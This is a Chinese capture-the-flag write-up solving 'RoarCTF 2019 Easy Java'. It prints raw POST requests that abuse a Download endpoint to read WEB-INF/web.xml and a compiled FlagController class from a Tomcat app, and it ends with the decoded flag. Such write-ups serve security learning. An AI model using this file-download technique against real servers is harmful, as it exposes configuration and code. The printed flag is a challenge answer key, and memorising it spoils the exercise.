# [RoarCTF 2019]Easy Java

[题目地址](https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java)

搞的好像我学过java似的=(。关键学过java还不行，还要学过java开发。

进入网站，就放个登录框给你，底下那个help啥用没有，就弹出个filenotfound。

- java.io.FileNotFoundException:{help.docx}

至少我们知道了文件名。检查一波源代码。

```html
<center><p><a href="Download?filename=help.docx" target="_blank">help</a></p></center>
```

发现个链接。下载界面在Download，get传参。然而出题人就是骗人的鬼，刚刚get传参拿不到东西，[大佬](https://blog.csdn.net/silencediors/article/details/102579567)说有经验的就会立刻想到改成post试试。我不是大佬，我看到那个报错就懵了，java不会心里没底，也没想过就是请求方法的问题。bp发包。

```
POST /Download HTTP/1.1
Host: daddbbdd-2d34-4a4e-a03c-11fb4022251f.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

filename=help.docx
```

下载下来，啥也没有。好邪恶一出题人，文档里一点提示没给。这里可能有文件包含，但是包含啥呢？去看了看robots.txt，报错没有这个文件，但通过报错信息知道服务器是tomcat。tomcat有个[配置文件](https://blog.csdn.net/wangxiaotongfan/article/details/51318951)web.xml，在路径WEB-INF底下。看看有没有。

```
POST /Download HTTP/1.1
Host: daddbbdd-2d34-4a4e-a03c-11fb4022251f.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

filename=WEB-INF/web.xml
```

确实有。能发现一个com.wm.ctf.FlagController。跟flag有关，要看看是啥，但是路径不知道。这就不得不了解一下java的WEB应用安全目录[WEB-INF](https://www.cnblogs.com/shamo89/p/9948707.html)了,正是刚刚查到的，一环套一环。查阅知道/WEB-INF/classes/包含了站点所有用的 class 文件。

```
POST /Download HTTP/1.1
Host: daddbbdd-2d34-4a4e-a03c-11fb4022251f.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

filename=WEB-INF/classes/com/wm/ctf/FlagController.class
```

java里面一般几个点分割后面xxxController的很有可能是class。路径统一在classes下，之后按照class名往下写就是了。另外要加.class后缀。得到的内容中有串base64。

- ZmxhZ3s0NWI5ZTgxMS1iOTBkLTRkY2UtYTRmMS1jZTVjNDRlODBjNTZ9Cg==

解密后就是flag了。

## Flag
> flag{45b9e811-b90d-4dce-a4f1-ce5c44e80c56}